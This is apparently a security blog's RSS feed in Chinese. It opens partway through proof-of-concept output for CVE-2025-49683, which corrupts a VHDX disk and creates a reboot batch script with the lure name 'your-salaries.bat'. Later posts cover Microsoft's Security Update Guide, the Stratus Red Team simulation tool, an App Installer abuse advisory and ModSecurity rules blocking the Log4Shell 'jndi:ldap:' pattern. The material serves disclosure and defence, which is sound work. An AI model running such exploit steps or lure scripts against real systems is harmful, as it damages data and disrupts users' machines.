&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;创建新的VHDX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;虚拟硬盘&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;文件&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;大小&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MB&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;路径&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MicrosoftLoosers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CVE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;2025&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;49683&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;corrupted_test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;vhdx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;正在挂载新的VHDX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;磁盘已初始化为NTFS格式&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;驱动器挂载为E&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;正在卸载VHDX以应用损坏&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;通过在8KB偏移处修改字节模拟损坏&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[+]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;损坏应用成功&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;重新挂载损坏的VHDX观察效果&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;创建立即重启批处理脚本&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;your&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;salaries&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bat&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;许可证与免责声明&#34;&gt;许可证与免责声明
&lt;/h3&gt;&lt;p&gt;本脚本仅用于教育和研究目的。作者和分发者对任何滥用造成的损害不承担责任。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;参考&#34;&gt;参考
&lt;/h3&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49683&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CVE-2025-49683&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/nu11secur1ty/CVE-mitre/tree/main/2025/CVE-2025-49683&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;源代码&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>微软安全更新指南(Security Update Guide)新手指南</title>
        <link>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E6%8C%87%E5%8D%97security-update-guide%E6%96%B0%E6%89%8B%E6%8C%87%E5%8D%97/</link>
        <pubDate>Mon, 04 Aug 2025 04:41:25 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E6%8C%87%E5%8D%97security-update-guide%E6%96%B0%E6%89%8B%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;p&gt;2020年11月起，微软安全更新指南门户全面改版。本文将为初次接触或尚未熟悉新界面的用户提供详细操作指引。&lt;/p&gt;
&lt;h3 id=&#34;安全更新指南是什么&#34;&gt;安全更新指南是什么？
&lt;/h3&gt;&lt;p&gt;该门户提供微软产品/服务的漏洞和更新信息，包含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;漏洞详情(CVE)&lt;/li&gt;
&lt;li&gt;受影响产品清单&lt;/li&gt;
&lt;li&gt;已知问题列表&lt;/li&gt;
&lt;li&gt;支持按产品/发布日期筛选&lt;/li&gt;
&lt;li&gt;支持CVE编号等关键词搜索&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;漏洞详情页功能解析&#34;&gt;漏洞详情页功能解析
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;CVSS评分&lt;/strong&gt;&lt;br&gt;
采用通用漏洞评分系统，悬停评分项可查看具体定义&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;可利用性&lt;/strong&gt;&lt;br&gt;
显示漏洞披露状态及微软独家&amp;quot;可利用性评估&amp;quot;指标&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;致谢名单&lt;/strong&gt;&lt;br&gt;
列出来自漏洞赏金计划的贡献者&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;常见问题&lt;/strong&gt;&lt;br&gt;
包含特殊配置要求、非标准更新方式等补充说明&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;安全更新列表&lt;/strong&gt;&lt;br&gt;
提供修复该漏洞的所有更新程序&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;api数据获取方案&#34;&gt;API数据获取方案
&lt;/h3&gt;&lt;p&gt;门户数据可通过CVRF格式API获取，具体资源包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;[视频] GitHub上的API使用教程&lt;/li&gt;
&lt;li&gt;[视频] 安全更新API调用演示&lt;/li&gt;
&lt;li&gt;[视频] 月度更新摘要HTML生成&lt;/li&gt;
&lt;li&gt;[视频] 数据导出至Excel的方法&lt;/li&gt;
&lt;li&gt;[视频] CVE/KB列表获取技巧&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;提示：门户将持续迭代改进，功能界面可能调整&lt;/p&gt;&lt;/blockquote&gt;
&lt;h4 id=&#34;相关资源&#34;&gt;相关资源
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://msrc-blog.microsoft.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;新版漏洞详情说明&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://msrc-blog.microsoft.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;安全更新指南改进公告&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Stratus Red Team：专为云环境设计的对抗模拟工具</title>
        <link>http://localhost:1313/p/stratus-red-team%E4%B8%93%E4%B8%BA%E4%BA%91%E7%8E%AF%E5%A2%83%E8%AE%BE%E8%AE%A1%E7%9A%84%E5%AF%B9%E6%8A%97%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7/</link>
        <pubDate>Mon, 04 Aug 2025 04:19:59 +0800</pubDate>
        
        <guid>http://localhost:1313/p/stratus-red-team%E4%B8%93%E4%B8%BA%E4%BA%91%E7%8E%AF%E5%A2%83%E8%AE%BE%E8%AE%A1%E7%9A%84%E5%AF%B9%E6%8A%97%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7/</guid>
        <description>&lt;p&gt;今天，我激动地发布过去几周开发的新开源项目：Stratus Red Team——一款专注于模拟云环境中常见攻击技术的对抗模拟和紫队工具。&lt;/p&gt;
&lt;h3 id=&#34;开发动机&#34;&gt;开发动机
&lt;/h3&gt;&lt;p&gt;我的职业经历大量涉及威胁检测。从学校毕业后，我首先在一家专注于终端安全的本地托管检测与响应公司从事威胁检测用例工作。后来当我转到科技公司的云安全岗位时，发现云环境中的恶意活动检测面临着相似挑战。&lt;/p&gt;
&lt;p&gt;其中一个挑战是在真实环境中复现攻击者的战术、技术和程序(TTPs)，以验证我们的日志管道和检测逻辑是否端到端正常工作。对于传统终端和本地安全，已有多个开源项目如Atomic Red Team™或MITRE Caldera。但这些工具都不是云原生构建的，缺乏对云服务商的专门支持，也缺少足够数量的云环境攻击技术。&lt;/p&gt;
&lt;h3 id=&#34;stratus-red-team介绍&#34;&gt;Stratus Red Team介绍
&lt;/h3&gt;&lt;p&gt;这个项目构想始于2021年初。得益于我在Datadog担任云安全研究员的新职位，终于得以实现。我们将其作为100%免费开源软件发布！&lt;/p&gt;
&lt;p&gt;官网：https://stratus-red-team.cloud/&lt;br&gt;
GitHub：https://github.com/DataDog/stratus-red-team&lt;/p&gt;
&lt;h3 id=&#34;技术实现原理&#34;&gt;技术实现原理
&lt;/h3&gt;&lt;h4 id=&#34;攻击技术即代码&#34;&gt;攻击技术即代码
&lt;/h4&gt;&lt;p&gt;每个攻击技术由两部分组成：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Terraform代码：描述执行攻击前需要部署的基础设施&lt;/li&gt;
&lt;li&gt;Go代码：定义技术元数据及其引爆逻辑&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;以&amp;quot;停止CloudTrail日志&amp;quot;攻击技术为例：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Terraform代码创建CloudTrail Trail和S3存储桶&lt;/li&gt;
&lt;li&gt;Go代码包含技术ID、MITRE ATT&amp;amp;CK映射，以及调用cloudtrail:StopLogging API的引爆函数&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;terraform自动化&#34;&gt;Terraform自动化
&lt;/h4&gt;&lt;p&gt;项目使用Hashicorp的terraform-exec库动态管理Terraform，无需用户预装：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;自动下载Terraform二进制到~/.stratus-red-team/terraform&lt;/li&gt;
&lt;li&gt;通过编程方式调用terraform apply/destroy&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;状态存储&#34;&gt;状态存储
&lt;/h4&gt;&lt;p&gt;工具在本地文件系统维护三种状态：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;攻击技术状态&lt;/li&gt;
&lt;li&gt;先决条件的Terraform状态&lt;/li&gt;
&lt;li&gt;Terraform输出值
存储路径：~/.stratus-red-team/[technique-id]&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;架构设计决策&#34;&gt;架构设计决策
&lt;/h3&gt;&lt;h4 id=&#34;编程语言选择&#34;&gt;编程语言选择
&lt;/h4&gt;&lt;p&gt;放弃Python选择Go的主要考量：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;强类型特性提升开发效率&lt;/li&gt;
&lt;li&gt;官方Terraform封装库支持&lt;/li&gt;
&lt;li&gt;编译时错误检查&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;代价是牺牲了动态加载用户代码的扩展性，新攻击技术必须打包到主二进制中。&lt;/p&gt;
&lt;h4 id=&#34;先决设施处理&#34;&gt;先决设施处理
&lt;/h4&gt;&lt;p&gt;采用内置Terraform代码全自动管理基础设施，当前限制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;仅支持新建资源测试&lt;/li&gt;
&lt;li&gt;不支持针对现有基础设施演练&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;合格攻击技术的标准&#34;&gt;合格攻击技术的标准
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;原子性：模拟攻击链中的单一步骤&lt;/li&gt;
&lt;li&gt;真实性：可推导出有效的威胁检测规则&lt;/li&gt;
&lt;li&gt;自包含性：不假设AWS账户的初始状态&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;未来规划&#34;&gt;未来规划
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;增加更多AWS攻击技术&lt;/li&gt;
&lt;li&gt;添加Kubernetes支持&lt;/li&gt;
&lt;li&gt;实现可选遥测功能(默认关闭)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;项目已在GitHub开源，欢迎通过Twitter或邮件提交反馈。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>微软应对App Installer滥用问题 | 安全技术深度解析</title>
        <link>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E5%BA%94%E5%AF%B9app-installer%E6%BB%A5%E7%94%A8%E9%97%AE%E9%A2%98-%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Mon, 04 Aug 2025 04:14:17 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E5%BA%94%E5%AF%B9app-installer%E6%BB%A5%E7%94%A8%E9%97%AE%E9%A2%98-%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;微软应对app-installer滥用问题&#34;&gt;微软应对App Installer滥用问题
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;2024年10月28日更新&lt;/strong&gt;&lt;br&gt;
微软于2023年12月28日默认禁用App Installer中的ms-appinstaller URI协议处理程序，以应对攻击者对CVE-2021-43890漏洞防护措施的绕过技术。现宣布在1.24.2411.0及以上版本中新增以下安全防护机制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;更新的用户安装体验流程&lt;/li&gt;
&lt;li&gt;对目标下载URL执行SmartScreen信誉检查&lt;/li&gt;
&lt;li&gt;增强的企业IT管理控制策略&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;技术细节请参阅&lt;a class=&#34;link&#34; href=&#34;https://learn.microsoft.com/app-installer-security&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;App Installer安全功能文档&lt;/a&gt;。&lt;/p&gt;
&lt;h4 id=&#34;用户操作指南&#34;&gt;用户操作指南
&lt;/h4&gt;&lt;p&gt;必须将App Installer升级至1.24.2411.0或更高版本。更新方法参见&lt;a class=&#34;link&#34; href=&#34;https://learn.microsoft.com/install-update-app-installer&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;安装和更新App Installer&lt;/a&gt;。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;技术背景分析&#34;&gt;技术背景分析
&lt;/h3&gt;&lt;p&gt;微软威胁情报团队发现攻击者通过社会工程学手段，诱导Windows用户触发ms-appinstaller协议安装恶意软件。我们已采取以下技术措施：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;默认禁用协议处理程序&lt;/li&gt;
&lt;li&gt;协调证书颁发机构吊销被滥用的代码签名证书&lt;/li&gt;
&lt;li&gt;在Microsoft Defender for Endpoint和Defender for Office部署专项检测规则&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h3 id=&#34;协议演进与风险&#34;&gt;协议演进与风险
&lt;/h3&gt;&lt;p&gt;ms-appinstaller协议最初在v1.0.12271.0版本引入，用于优化MSIX/MSIXBundle安装体验。近期攻击者通过伪造网页诱导用户直接执行恶意安装包。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;技术缓解方案&#34;&gt;技术缓解方案
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;措施类型&lt;/th&gt;
          &lt;th&gt;技术实现细节&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;默认禁用&lt;/td&gt;
          &lt;td&gt;2023年12月28日起，所有安装请求需先下载MSIX文件，触发本地杀毒软件扫描&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;版本控制&lt;/td&gt;
          &lt;td&gt;受影响版本范围：v1.18.2691至v1.21.3421&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;企业策略&lt;/td&gt;
          &lt;td&gt;组策略&lt;code&gt;EnableMSAppInstallerProtocol&lt;/code&gt;可强制禁用协议&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;风险检测命令&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Get-AppxPackage&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DesktopAppInstaller&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Version&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr&gt;
&lt;h3 id=&#34;受影响系统补丁&#34;&gt;受影响系统补丁
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;KB5023773 (19042.2788/19044.2788/19045.2788)&lt;/li&gt;
&lt;li&gt;KB5028171 (20348.1850)&lt;/li&gt;
&lt;li&gt;KB5023774 (22000.1761)&lt;/li&gt;
&lt;li&gt;KB5018496 (22621.755)&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;技术参考&#34;&gt;技术参考
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://learn.microsoft.com/msix-web-install&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;MSIX网页安装原理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43890&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CVE-2021-43890详情&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.microsoft.com/threat-intelligence&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;攻击技术分析报告&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>ModSecurity规则过滤CVE-2021-44228/Log4Shell漏洞[更新版]</title>
        <link>http://localhost:1313/p/modsecurity%E8%A7%84%E5%88%99%E8%BF%87%E6%BB%A4cve-2021-44228/log4shell%E6%BC%8F%E6%B4%9E%E6%9B%B4%E6%96%B0%E7%89%88/</link>
        <pubDate>Mon, 04 Aug 2025 03:57:53 +0800</pubDate>
        
        <guid>http://localhost:1313/p/modsecurity%E8%A7%84%E5%88%99%E8%BF%87%E6%BB%A4cve-2021-44228/log4shell%E6%BC%8F%E6%B4%9E%E6%9B%B4%E6%96%B0%E7%89%88/</guid>
        <description>&lt;p&gt;作为临时解决方案，我的一个朋友编写了ModSecurity规则来过滤CVE-2021-44228/LogJam/Log4Shell漏洞攻击，并允许我分享给大家。&lt;/p&gt;
&lt;p&gt;初始规则：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-apache&#34; data-lang=&#34;apache&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;SecRule&lt;/span&gt; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ARGS|REQUEST_HEADERS|REQUEST_URI|REQUEST_BODY|REQUEST_COOKIES|REQUEST_LINE|QUERY_STRING &lt;span class=&#34;s2&#34;&gt;&amp;#34;jndi:ldap:&amp;#34;&lt;/span&gt; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;phase:1, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  id:751001, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  t:none, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  deny, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  status:403, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  log, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  auditlog, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  msg:&amp;#39;Block: CVE-2021-44228 - deny pattern \&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;jndi:ldap:\&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;&amp;#39;, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  severity:&amp;#39;5&amp;#39;, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  rev:1, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  tag:&amp;#39;no_ar&amp;#39;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;增强版规则：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-apache&#34; data-lang=&#34;apache&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;SecRule&lt;/span&gt; \
